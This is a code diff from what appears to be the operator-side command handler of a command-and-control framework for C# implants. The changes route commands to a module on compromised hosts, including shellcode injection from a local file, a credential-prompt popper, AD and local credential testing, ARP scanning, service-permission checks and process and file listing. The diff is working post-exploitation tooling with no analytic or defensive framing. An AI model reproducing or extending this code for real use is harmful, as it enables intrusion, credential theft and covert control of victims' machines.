@@ -494,6 +494,11 @@ def runcommand(command, randomuri):
       return
 
   elif implant_type == "C#":
+      try:
+        check_module_loaded("Core.exe", randomuri)
+      except Exception as e:
+        print ("Error loading Core.exe: %s" % e)
+        
       if "searchhelp" in command.lower():
         searchterm = (command.lower()).replace("searchhelp ","")
         import string
@@ -509,6 +514,8 @@ def runcommand(command, randomuri):
         kill_implant(randomuri)
 
       elif "inject-shellcode" in command.lower():
+        params = re.compile("inject-shellcode", re.IGNORECASE)
+        params = params.sub("", command)
         check_module_loaded("Inject.dll", randomuri)
         readline.set_completer(filecomplete)
         path = raw_input("Location of shellcode file: ")
@@ -519,7 +526,7 @@ def runcommand(command, randomuri):
           shellcodefile = load_file(path)
           if shellcodefile != None:
             arch = "64"
-            new_task("$Shellcode%s=\"%s\"" % (arch,base64.b64encode(shellcodefile)), randomuri)
+            new_task("run-exe Core.Program Core Inject-Shellcode %s%s" % (base64.b64encode(shellcodefile),params), randomuri)
             new_task(command, randomuri)
         except Exception as e:
           print ("Error loading file: %s" % e)
@@ -537,36 +544,43 @@ def runcommand(command, randomuri):
           pid = get_pid(randomuri)
           new_task("exit" % pid,randomuri)
           kill_implant(randomuri)
-
-      elif "prochandler" in command.lower():
-        check_module_loaded("Get-ProcessList.dll", randomuri)
-        new_task(command,randomuri)
-        
+    
       elif "seatbelt " in command.lower():
         check_module_loaded("Seatbelt.exe", randomuri)
         new_task(command,randomuri)
 
-      elif "get-serviceperms" in command.lower():
-        params = re.compile("get-serviceperms ", re.IGNORECASE)
-        params = params.sub("", command)
-        check_module_loaded("Get-ServicePerms.exe", randomuri)
-        if params:
-          new_task("run-exe ServicePerms Get-ServicePerms %s" % params,randomuri)
-        else:
-          new_task("run-exe ServicePerms Get-ServicePerms",randomuri)
+      elif (command.lower().startswith("arpscan")):
+        new_task("run-exe Core.Program Core %s" % command,randomuri)
+  
+      elif (command.lower().startswith("testadcredential")):
+        new_task("run-exe Core.Program Core %s" % command,randomuri)
+          
+      elif (command.lower().startswith("testlocalcredential")):
+        new_task("run-exe Core.Program Core %s" % command,randomuri)
 
-      elif "arpscan" in command.lower():
-        params = re.compile("arpscan ", re.IGNORECASE)
-        params = params.sub("", command)
-        check_module_loaded("ArpScannerDLL.exe", randomuri)
-        if params:
-          new_task("run-exe ARP ArpScannerDLL %s" % params,randomuri)
-        else:
-          new_task("run-exe ARP ArpScannerDLL",randomuri)
+      elif (command.lower().startswith("turtle")):
+        new_task("run-exe Core.Program Core %s" % command,randomuri)
+                    
+      elif (command.lower().startswith("resolvednsname")):
+        new_task("run-exe Core.Program Core %s" % command,randomuri)
+          
+      elif (command.lower().startswith("resolveip")):
+        new_task("run-exe Core.Program Core %s" % command,randomuri)
+                  
+      elif (command.lower().startswith("cred-popper")):
+        new_task("run-exe Core.Program Core %s" % command,randomuri)
+
+      elif (command.lower().startswith("get-serviceperms")):
+        new_task("run-exe Core.Program Core %s" % command,randomuri)
+      
+      elif (command.lower().startswith("ls")):
+        new_task("run-exe Core.Program Core %s" % command,randomuri)
+                    
+      elif (command.lower() == "pwd") or (command.lower() == "pwd "):
+        new_task("run-exe Core.Program Core pwd",randomuri)
           
       elif (command.lower() == "ps") or (command.lower() == "ps "):
-        check_module_loaded("Get-ProcessList.dll", randomuri)
-        new_task(command,randomuri)
+        new_task("run-exe Core.Program Core Get-ProcessList",randomuri)
 
       elif "loadmoduleforce" in command.lower():
         params = re.compile("loadmoduleforce ", re.IGNORECASE)
